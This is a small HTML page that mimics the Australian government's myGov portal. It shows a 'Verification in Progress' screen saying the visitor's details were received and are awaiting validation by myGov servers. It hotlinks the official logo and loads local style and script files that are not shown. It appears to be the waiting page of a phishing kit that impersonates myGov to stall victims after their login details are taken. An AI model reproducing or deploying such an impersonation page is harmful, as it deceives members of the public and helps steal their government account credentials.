<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>myGov - Verification in Progress</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header class="mygov-header">
        <div class="header-content">
            <div class="logo-section">
                <img src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg" alt="myGov" class="mygov-logo">
            </div>
            <div class="help-section">
                <a href="#" class="help-link">Help</a>
            </div>
        </div>
    </header>
    <div class="container">
        <div class="login-container">
            <div class="header">
                <h1>Verification in Progress</h1>
                <p>Your details have been received and are being verified</p>
            </div>
            <div class="verification-status">
                <div class="spinner"></div>
                <p class="status-message">Waiting for myGov servers to validate your information...</p>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
